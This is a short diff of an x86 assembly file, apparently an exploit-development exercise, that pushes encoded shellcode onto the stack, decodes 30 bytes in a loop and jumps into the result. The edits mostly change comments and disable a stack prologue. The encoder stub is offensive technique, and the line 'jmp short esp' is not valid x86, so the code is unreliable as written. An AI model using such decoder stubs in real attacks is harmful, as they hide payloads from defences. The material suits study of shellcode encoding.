@@ -6,10 +6,11 @@ global _start
 section .text
 _start:
 
-	push ebp
-	mov ebp, esp
-	sub esp, 32
+	;push ebp
+	;mov ebp, esp
+	;sub esp, 32
 
+	; push the encoded shellcode onto the stack
         push 0x909082cf
         push 0x0db2e38b
         push 0x55e48b52
@@ -20,7 +21,7 @@ _start:
         push 0x6a52c233
 
 
-	; "pop" the memory address to encoded shellcode off the stack into a registers
+	; move the memory address to encoded shellcode, which is the location of ESP, into esi
 	mov esi, esp
 	
 	; set up the counter. The shellcode is 30 bytes long, so set the counter to 30 
@@ -33,7 +34,10 @@ decode:
 	inc esi
 	loop decode
 
-	jmp short esp	
+	jmp short esp ; jump to the shellcode
+
+
+; this is all old shellcode from the previous encoder assembly
 
 ;call_decoder:
 	; call the decoder section of the code. This puts memory location of the encoded shellcode on the stack
